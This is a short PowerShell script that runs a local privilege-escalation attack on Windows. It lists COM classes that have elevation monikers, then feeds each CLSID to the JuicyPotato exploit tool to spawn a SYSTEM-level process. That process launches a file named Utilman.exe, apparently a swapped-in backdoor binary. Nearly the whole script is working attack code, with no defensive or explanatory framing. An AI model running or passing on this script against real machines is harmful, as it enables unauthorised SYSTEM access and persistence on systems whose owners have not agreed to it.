<#
 .SYNOPSIS
    Enumerate elevation-capable COM monikers and test each with JuicyPotato.

 .NOTES
    Put this script in C:\Users\DSU\Documents alongside JuicyPotato.exe
    Run in an elevated PowerShell:
      cd C:\Users\DSU\Documents
      .\Test-JuicyPotato.ps1
#>

# 1) Mount HKCR so we can query CLSID keys
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null

# 2) Find all CLSIDs with an 'Elevation' subkey (real COM elevation monikers)
$elevCLSID = Get-ChildItem HKCR:\CLSID -ErrorAction SilentlyContinue |
    Where-Object { Test-Path "HKCR:\CLSID\$($_.PSChildName)\Elevation" } |
    Select-Object -ExpandProperty PSChildName

Write-Host "Found $($elevCLSID.Count) elevation monikers:`n" -ForegroundColor Green
$elevCLSID | ForEach-Object { Write-Host " - $_" }

# 3) Common JuicyPotato settings
$JuicyPath  = Join-Path $PWD "JuicyPotato.exe"
$listenPort = 1337
$listenIP   = "127.0.0.1"
$cmdPath    = "C:\Windows\System32\cmd.exe"
$cmdArgs    = '/c C:\Users\DSU\Documents\Utilman.exe'

# 4) Loop through each elevation CLSID and try to spawn SYSTEM-shell
foreach ($guid in $elevCLSID) {
    Write-Host "`n=== Testing CLSID $guid ===" -ForegroundColor Cyan
    & $JuicyPath `
      -l $listenPort `
      -m $listenIP `
      -t * `
      -p $cmdPath `
      -a $cmdArgs `
      -c $guid

    Write-Host "----------------------------------------"
}
